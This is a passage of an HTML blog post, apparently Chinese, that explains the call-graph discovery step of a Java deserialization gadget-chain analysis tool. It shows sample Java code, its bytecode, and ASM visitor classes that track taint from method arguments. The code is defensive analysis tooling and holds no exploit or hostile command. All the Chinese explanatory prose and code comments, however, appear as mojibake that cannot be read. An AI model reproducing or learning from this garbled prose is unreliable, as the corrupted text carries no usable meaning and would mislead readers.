class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String cmd = <span class="keyword">new</span> A().method1(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        Integer n = Integer.parseInt(s);</span><br><span class="line"></span><br><span class="line">        n = number;</span><br><span class="line">        String value = n.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method1</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getValue</code> éƒ¨åˆ†çš„å­—èŠ‚ç ï¼Œç”¨ç©ºè¡Œåˆ†éš”äº†ä¸Šé¢å››æ¡è¯­å¥çš„å­—èŠ‚ç ï¼Œå‡ºç°çš„å­—èŠ‚ç æŒ‡ä»¤åŒ…æ‹¬ï¼š<br>ldc ä»å¸¸é‡æ± åŠ è½½æ•°æ®åˆ°æ“ä½œæ•°æ ˆï¼Œastore ä»æ ˆé¡¶å¼¹å‡ºå¹¶å­˜å‚¨åˆ°æœ¬åœ°å˜é‡è¡¨ï¼Œaload ä»æœ¬åœ°å˜é‡è¡¨åŠ è½½æ•°æ®åˆ°æ“ä½œæ•°æ ˆï¼Œinvokestatic è°ƒç”¨ç±»æ–¹æ³•ï¼ˆé™æ€ï¼‰ï¼Œinvokevirtual è°ƒç”¨å®ä¾‹æ–¹æ³•ï¼Œreturn ä»å½“å‰æ–¹æ³•è¿”å› voidã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">(java.lang.Integer)</span></span>;</span><br><span class="line">  descriptor: (Ljava/lang/Integer;)V</span><br><span class="line">  flags: ACC_PUBLIC</span><br><span class="line">  Code:</span><br><span class="line">    stack=<span class="number">1</span>, locals=<span class="number">5</span>, args_size=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">       0: ldc           #5                  // String 100 å…¥æ ˆ</span><br><span class="line">       <span class="number">2</span>: astore_2                          <span class="comment">// å‡ºæ ˆ</span></span><br><span class="line"></span><br><span class="line">       <span class="number">3</span>: aload_2                           <span class="comment">// å…¥æ ˆï¼Œinvokestatic çš„å‚æ•°ï¼Œæ‰§è¡Œå®Œæ¯•åç»“æœå…¥æ ˆ</span></span><br><span class="line">       4: invokestatic  #6                  // Method java/lang/Integer.parseInt:(Ljava/lang/String;)I</span><br><span class="line">       7: invokestatic  #7                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">      <span class="number">10</span>: astore_3                          <span class="comment">// å‡ºæ ˆï¼Œå­˜å‚¨æ‰§è¡Œç»“æœ</span></span><br><span class="line"></span><br><span class="line">      <span class="number">11</span>: aload_1                           <span class="comment">// å…¥æ ˆï¼Œå‚æ•° number</span></span><br><span class="line">      <span class="number">12</span>: astore_3                          <span class="comment">// å‡ºæ ˆ</span></span><br><span class="line"></span><br><span class="line">      <span class="number">13</span>: aload_3                           <span class="comment">// å…¥æ ˆï¼Œinvokevirtual çš„å‚æ•°</span></span><br><span class="line">      14: invokevirtual #8                  // Method java/lang/Integer.toString:()Ljava/lang/String; æ‰§è¡Œå®Œæ¯•åç»“æœå…¥æ ˆ</span><br><span class="line">      <span class="number">17</span>: astore        <span class="number">4</span>                   <span class="comment">// å‡ºæ ˆ</span></span><br><span class="line">      <span class="number">19</span>: <span class="keyword">return</span>                            <span class="comment">// è¿”å› void</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">6</span>: <span class="number">0</span></span><br><span class="line">      line <span class="number">7</span>: <span class="number">3</span></span><br><span class="line">      line <span class="number">9</span>: <span class="number">11</span></span><br><span class="line">      line <span class="number">10</span>: <span class="number">13</span></span><br><span class="line">      line <span class="number">11</span>: <span class="number">19</span></span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨æ–¹æ³•å‰ï¼Œè¿›è¡Œå‚æ•°çš„å…¥æ ˆï¼Œå³åˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œæ‰§è¡Œå®Œæ¯•åç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚å®é™…ä¸Šè¿™éƒ¨åˆ†çš„æ¨¡æ‹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œè¦è¯´æ±‡ç¼–è¯­è¨€å€’è¿˜ä¼šçœ‹ï¼Œä½†æ˜¯ Java å­—èŠ‚ç ä¹Ÿè¿˜æ²¡åˆ°é‚£ä¹ˆåº•å±‚ï¼Œæˆ‘çš„ç†è§£æ˜¯è°ƒç”¨å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼Œæ‰§è¡Œå®Œæ¯•åä»ç³»ç»Ÿæ ˆå¼¹å‡ºæ ˆå¸§ï¼Œé‚£ä¹ˆè¿”å›ç»“æœå­˜å…¥ä¸Šä¸€ä¸ªæ ˆå¸§çš„æ“ä½œæ•°æ ˆæ ˆé¡¶ï¼Ÿå›å¤´ç­‰æˆ‘ææ˜ç™½äº†å†è¡¥ä¸¤å¼ å›¾â€¦</p><h2 id="7-CallGraphDiscovery"><a href="#7-CallGraphDiscovery" class="headerlink" title="7. CallGraphDiscovery"></a>7. CallGraphDiscovery</h2><p><code>discover</code> æ–¹æ³•åˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿/é‡å†™ä¿¡æ¯ã€æ•°æ®æµä¿¡æ¯ï¼Œç»“åˆ asm è®¿é—®è€…åˆ†æè¢«è°ƒæ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«è°ƒç”¨è€…æ–¹æ³•çš„å‚æ•°æ‰€å½±å“ã€‚</p><p>ä»¥ä¸‹é¢ getValue æ–¹æ³•ä¸ºä¾‹ï¼Œè°ƒç”¨äº† parseInt å’Œ toString ä¸¤ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯å‚æ•° number åªä¼šå½±å“åˆ° toStringã€‚å› æ­¤å¦‚æœæ±¡ç‚¹ï¼ˆæ”»å‡»è€…çš„è¾“å…¥æ•°æ®ï¼‰èµ°åˆ° getValue æ–¹æ³•ä¸”å‚æ•° number æ˜¯å¯æ§çš„ï¼ˆå³ä¸Šä¸€æ­¥åˆ†æèƒ½å¤Ÿä¼ é€’æ±¡æŸ“ï¼‰ï¼Œé‚£ä¹ˆè¿›ä¸€æ­¥åªéœ€è¦æ£€æŸ¥ toString æ–¹æ³•ï¼Œè€Œ parseInt æ–¹æ³•å°±ä¸ç”¨å†æ£€æŸ¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">(Integer number)</span> </span>&#123;</span><br><span class="line">    String s = <span class="string">&quot;100&quot;</span>;</span><br><span class="line">    Integer n = Integer.parseInt(s);</span><br><span class="line">    </span><br><span class="line">    n = number;</span><br><span class="line">    String value = n.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> æ–¹æ³•çš„å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(CallGraphDiscovery.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨å…³ç³»ä¿¡æ¯ï¼šæ–¹æ³•æ‰€å±ç±»åï¼Œæ–¹æ³•åï¼Œæ–¹æ³•æè¿°ç¬¦ï¼Œè¢«è°ƒæ–¹æ³•æ‰€å±ç±»åï¼Œè¢«è°ƒæ–¹æ³•åï¼Œè¢«è°ƒæ–¹æ³•æè¿°ç¬¦ï¼Œæ–¹æ³•å‚æ•°ç´¢å¼•ï¼Œæ–¹æ³•å‚æ•°å¯¹è±¡çš„å­—æ®µåç§°ï¼Œè¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GraphCall&gt; discoveredCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ†æè°ƒç”¨å…³ç³»ï¼Œå³è¢«è°ƒæ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«ï¼ˆè°ƒç”¨è€…ï¼‰æ–¹æ³•çš„å‚æ•°æ‰€å½±å“</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  é…ç½®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯ï¼ˆinheritanceMapï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆï¼ŒsubClassMapï¼šçˆ¶ç±»-&gt;å­ç±»é›†åˆï¼‰</span></span><br><span class="line">    InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">    <span class="comment">// åŠ è½½æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    SerializableDecider serializableDecider = config.getSerializableDecider(methodMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰çš„ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123; <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);   <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// åˆ¤æ–­è¢«è°ƒæ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«è°ƒç”¨è€…æ–¹æ³•çš„å‚æ•°æ‰€å½±å“</span></span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitMethod -&gt; visitOuterClass -&gt; visitInnerClass -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> ModelGeneratorClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6),</span><br><span class="line">                        ClassReader.EXPAND_FRAMES);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorClassVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™äº†äº”ä¸ªè®¿é—®è€…æ–¹æ³•ï¼Œä¸»è¦å…³æ³¨ <code>visitMethod</code> ä¸­è°ƒç”¨ <code>ModelGeneratorMethodVisitor</code> å¯¹æ–¹æ³•è¿›è¡Œåˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelGeneratorClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// æ•°æ®æµä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ModelGeneratorClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      InheritanceMap inheritanceMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      SerializableDecider serializableDecider, <span class="keyword">int</span> api)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api); <span class="comment">// ASM API ç‰ˆæœ¬</span></span><br><span class="line">        <span class="keyword">this</span>.classMap = classMap;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="keyword">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;            <span class="comment">// ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> String signature;       <span class="comment">// ç­¾å</span></span><br><span class="line">    <span class="keyword">private</span> String superName;       <span class="comment">// çˆ¶ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> String[] interfaces;    <span class="comment">// æ¥å£</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">                      String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="comment">// è®°å½•ç±»çš„ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.signature = signature;</span><br><span class="line">        <span class="keyword">this</span>.superName = superName;</span><br><span class="line">        <span class="keyword">this</span>.interfaces = interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè¿”å›æ–°çš„æ–¹æ³•è§‚å¯Ÿè€…</span></span><br><span class="line">        <span class="comment">// å¦‚æœç±»è§‚å¯Ÿè€…çš„ cv å˜é‡ä¸ºç©ºï¼Œåˆ™è¿”å› nullï¼Œå¦åˆ™è¿”å› cv.visitMethod</span></span><br><span class="line">        MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–¹æ³•è®¿é—®è€…ï¼Œåˆ¤æ–­æ–¹æ³•å‚æ•°ä¸è¢«è°ƒç”¨æ–¹æ³•å‚æ•°çš„ä¼ é€’å…³ç³»</span></span><br><span class="line">        <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰:visitCode -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        ModelGeneratorMethodVisitor modelGeneratorMethodVisitor = <span class="keyword">new</span> ModelGeneratorMethodVisitor(classMap,</span><br><span class="line">                inheritanceMap, passthroughDataflow, serializableDecider, api, mv, <span class="keyword">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="comment">// ç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span> </span>&#123;   <span class="comment">// è®¿é—®ç±»çš„å¤–å›´ç±»ï¼ˆå¦‚æœæœ‰ï¼‰</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="keyword">super</span>.visitOuterClass(owner, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="keyword">int</span> access)</span> </span>&#123;  <span class="comment">// è®¿é—®å†…éƒ¨ç±»ï¼Œè¯¥å†…éƒ¨ç±»ä¸ä¸€å®šæ˜¯è¢«è®¿é—®çš„ç±»çš„æˆå‘˜</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Write some tests to make sure we can ignore this</span></span><br><span class="line">        <span class="keyword">super</span>.visitInnerClass(name, outerName, innerName, access);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelGeneratorMethodVisitor</code> ä¹Ÿç»§æ‰¿äº† <code>TaintTrackingMethodVisitor</code> å®ç°ï¼Œä¸è¿‡åªé‡å†™äº†å…¶ä¸­çš„ 3 ä¸ªè®¿é—®è€…æ–¹æ³•</p><ul><li>visitCodeï¼šå¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®ï¼ŒæŠŠå‚æ•°å…¨éƒ¨å­˜åˆ°æœ¬åœ°å˜é‡è¡¨</li><li>visitFieldInsnï¼šè®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤</li><li>visitMethodInsnï¼šè®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</li></ul><p><code>visitCode</code> å’Œ PassthroughDataflowMethodVisitorï¼ˆç›´æ¥å­˜å‚¨å‚æ•°ç´¢å¼•ï¼‰ä¸­çš„å®ç°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯è¿™é‡Œå°† <code>arg</code> ä¸å‚æ•°ç´¢å¼•è¿›è¡Œæ‹¼æ¥ï¼Œå­˜å‚¨å­—ç¬¦ä¸²åˆ°æœ¬åœ°å˜é‡è¡¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;   <span class="comment">// å¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®</span></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitCode åˆå§‹åŒ–æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">    <span class="keyword">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•å‚æ•°åˆ°æœ¬åœ°å˜é‡è¡¨ savedVariableState.localVars</span></span><br><span class="line">    <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆéšå¼ï¼‰ä¸ºå¯¹è±¡å®ä¾‹ this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ arg å‰ç¼€æ¥è¡¨ç¤ºæ–¹æ³•å…¥å‚ï¼Œåç»­ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºç›®æ ‡è°ƒç”¨æ–¹æ³•çš„å…¥å‚</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†å‚æ•°ï¼Œæ ¹æ®æè¿°ç¬¦å¾—å‡ºå‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> ä¹Ÿå’Œ PassthroughDataflowMethodVisitorï¼ˆç›´æ¥å­˜å‚¨å‚æ•°ç´¢å¼•ï¼‰ä¸­çš„å®ç°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯è¿™é‡Œå°†å­—æ®µåç§°ä¸ <code>argå‚æ•°ç´¢å¼•</code> å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åå­˜å‚¨åˆ°æ ˆé¡¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 